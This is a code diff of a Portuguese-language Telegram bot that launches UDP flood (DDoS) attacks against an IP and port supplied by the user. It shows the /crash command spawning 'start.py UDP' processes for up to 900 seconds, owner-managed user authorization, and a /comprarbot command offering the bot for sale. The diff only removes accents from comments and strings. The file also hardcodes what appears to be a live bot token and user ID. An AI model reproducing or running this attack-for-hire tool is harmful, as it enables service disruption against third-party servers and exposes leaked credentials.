@@ -6,17 +6,17 @@ import time
 BOT_TOKEN = "7972626459:AAGjV9QjaDRfEYXOO-X4TgXoWo2MqQbwMz8"
 SEU_ID_TELEGRAM = 6430703027
 bot = telebot.TeleBot(BOT_TOKEN)
-processos = {}  # Dicionário para armazenar os processos de ataque
-authorized_users = [SEU_ID_TELEGRAM]  # Lista de usuários autorizados
-MAX_ATTACKS = 3  # Limite de ataques simultâneos
+processos = {}  # Dicionario para armazenar os processos de ataque
+authorized_users = [SEU_ID_TELEGRAM]  # Lista de usuarios autorizados
+MAX_ATTACKS = 3  # Limite de ataques simultaneos
 
-# Função para validar o formato de IP e Porta
+# Funcao para validar o formato de IP e Porta
 def validar_ip_porta(ip_porta):
     padrao = r'^\d{1,3}(.\d{1,3}){3}:\d+$'
     match = re.match(padrao, ip_porta)
     return match is not None
 
-# Função para executar o comando do ataque
+# Funcao para executar o comando do ataque
 def executar_comando(ip_porta, threads, tempo):
     comando_terminal = f"python3 start.py UDP {ip_porta} {threads} {tempo}"
     try:
@@ -25,12 +25,12 @@ def executar_comando(ip_porta, threads, tempo):
         )
         processos[ip_porta] = processo
         time.sleep(int(tempo))  # Aguarda o tempo do ataque
-        processo.terminate()  # Termina o processo após o tempo especificado
+        processo.terminate()  # Termina o processo apos o tempo especificado
         del processos[ip_porta]  # Remove o processo da lista
     except Exception as e:
         print(f"Erro ao executar o comando: {str(e)}")
 
-# Função para gerenciar o limite de ataques simultâneos
+# Funcao para gerenciar o limite de ataques simultaneos
 def manage_attacks():
     if len(processos) >= MAX_ATTACKS:
         oldest_process = list(processos.values())[0]  # Pega o primeiro processo
@@ -42,13 +42,13 @@ def manage_attacks():
 def start_message(message):
     welcome_text = (
         "🚀 Bem-vindo ao bot!\n\n"
-        "Aqui estão os comandos disponíveis para você:\n\n"
-        "🔹 **Comandos básicos**:\n"
+        "Aqui estao os comandos disponiveis para voce:\n\n"
+        "🔹 **Comandos basicos**:\n"
         "/crash IP:PORTA <threads> <tempo> - Inicia um ataque no IP da partida 🕹️💥\n"
-        "/meuid - Mostra seu ID de usuário 👤\n\n"
-        "🔸 **Comandos para adicionar ou remover usuários**:\n"
-        "/adduser <ID> - Adiciona um usuário autorizado (Somente o dono pode) ✅\n"
-        "/removeuser <ID> - Remove um usuário autorizado (Somente o dono pode) ❌\n\n"
+        "/meuid - Mostra seu ID de usuario 👤\n\n"
+        "🔸 **Comandos para adicionar ou remover usuarios**:\n"
+        "/adduser <ID> - Adiciona um usuario autorizado (Somente o dono pode) ✅\n"
+        "/removeuser <ID> - Remove um usuario autorizado (Somente o dono pode) ❌\n\n"
         "💬 **Comando para comprar o bot**:\n"
         "/comprarbot - Entre em contato para adquirir o bot 🛒"
     )
@@ -58,32 +58,32 @@ def start_message(message):
 @bot.message_handler(commands=['crash'])
 def crash(message):
     if message.from_user.id not in authorized_users:
-        bot.send_message(message.chat.id, "🚫 Você não está autorizado a usar este comando.")
+        bot.send_message(message.chat.id, "🚫 Voce nao esta autorizado a usar este comando.")
         return
     
     comando = message.text.split()
-    if len(comando) < 2:  # Caso não envie IP:PORTA nem parâmetros extras
+    if len(comando) < 2:  # Caso nao envie IP:PORTA nem parametros extras
         bot.send_message(message.chat.id, "⚠️ Uso correto: /crash <IP:PORTA> <threads> <tempo>")
         return
 
     ip_porta = comando[1]
-    threads = "10"  # Valor padrão para threads
-    tempo = "900"  # Valor padrão para tempo
+    threads = "10"  # Valor padrao para threads
+    tempo = "900"  # Valor padrao para tempo
 
-    # Verifica se o usuário passou tempo como argumento
+    # Verifica se o usuario passou tempo como argumento
     if len(comando) >= 3:
         tempo = comando[2]
     
-    # Verifica se o usuário passou threads como argumento
+    # Verifica se o usuario passou threads como argumento
     if len(comando) >= 4:
         threads = comando[3]
     
     # Verifica e valida o formato de IP:PORTA
     if not validar_ip_porta(ip_porta):
-        bot.send_message(message.chat.id, "⚠️ Formato de IP ou porta inválido.")
+        bot.send_message(message.chat.id, "⚠️ Formato de IP ou porta invalido.")
         return
 
-    manage_attacks()  # Gerencia os ataques simultâneos
+    manage_attacks()  # Gerencia os ataques simultaneos
     executar_comando(ip_porta, threads, tempo)  # Executa o comando de ataque
     bot.send_message(
         message.chat.id,
@@ -97,7 +97,7 @@ def crash(message):
 @bot.message_handler(commands=['adduser'])
 def add_user(message):
     if message.from_user.id != SEU_ID_TELEGRAM:
-        bot.send_message(message.chat.id, "🚫 Apenas o dono pode adicionar usuários.")
+        bot.send_message(message.chat.id, "🚫 Apenas o dono pode adicionar usuarios.")
         return
 
     comando = message.text.split()
@@ -108,15 +108,15 @@ def add_user(message):
     user_id = int(comando[1])
     if user_id not in authorized_users:
         authorized_users.append(user_id)
-        bot.send_message(message.chat.id, f"✅ O usuário {user_id} foi adicionado à lista de autorizados.")
+        bot.send_message(message.chat.id, f"✅ O usuario {user_id} foi adicionado a lista de autorizados.")
     else:
-        bot.send_message(message.chat.id, f"⚠️ O usuário {user_id} já está na lista de autorizados.")
+        bot.send_message(message.chat.id, f"⚠️ O usuario {user_id} ja esta na lista de autorizados.")
 
 # Comando /removeuser
 @bot.message_handler(commands=['removeuser'])
 def remove_user(message):
     if message.from_user.id != SEU_ID_TELEGRAM:
-        bot.send_message(message.chat.id, "🚫 Apenas o dono pode remover usuários.")
+        bot.send_message(message.chat.id, "🚫 Apenas o dono pode remover usuarios.")
         return
 
     comando = message.text.split()
@@ -127,16 +127,16 @@ def remove_user(message):
     user_id = int(comando[1])
     if user_id in authorized_users:
         authorized_users.remove(user_id)
-        bot.send_message(message.chat.id, f"❌ O usuário {user_id} foi removido da lista de autorizados.")
+        bot.send_message(message.chat.id, f"❌ O usuario {user_id} foi removido da lista de autorizados.")
     else:
-        bot.send_message(message.chat.id, f"⚠️ O usuário {user_id} não está na lista de autorizados.")
+        bot.send_message(message.chat.id, f"⚠️ O usuario {user_id} nao esta na lista de autorizados.")
 
 # Comando /comprarbot
 @bot.message_handler(commands=['comprarbot'])
 def comprar_bot(message):
     bot.send_message(message.chat.id, "💬 Entre em contato para adquirir o bot: https://t.me/werbert_ofc 🛒")
 
-# Função para manter o bot ativo (reconectar automaticamente em caso de falhas)
+# Funcao para manter o bot ativo (reconectar automaticamente em caso de falhas)
 def keep_alive():
     while True:
         try:
